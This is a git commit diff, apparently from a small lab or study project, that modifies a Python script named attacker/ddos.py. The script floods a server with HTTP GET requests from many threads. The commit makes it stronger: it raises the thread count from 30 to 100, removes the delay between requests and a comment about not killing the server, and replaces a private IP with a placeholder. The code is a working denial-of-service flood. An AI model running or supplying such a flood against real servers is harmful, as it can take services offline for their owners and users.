99f7501e1ab2e74c6ce6b83e10a9b7cf1285e56f
Ricardo França <70002761+RicardoMFranca@users.noreply.github.com>
2025-06-24 21:58:55 -0300

    aumentando número de requisições e removendo ip

--- attacker/ddos.py
+++ attacker/ddos.py
@@ -5,12 +5,10 @@ import time
 def flood():
     while True:
         try:
-            requests.get("http://192.168.0.105:5000/", timeout=1)
+            requests.get("ENDEREÇO_DO_SERVIDOR", timeout=1)
         except:
             pass
-        time.sleep(0.05)  # evita travar o sistema com sleep leve
 
-# Só 30 threads impactando sem matar o servidor
-for _ in range(30):
+for _ in range(100):
     t = threading.Thread(target=flood)
     t.start()
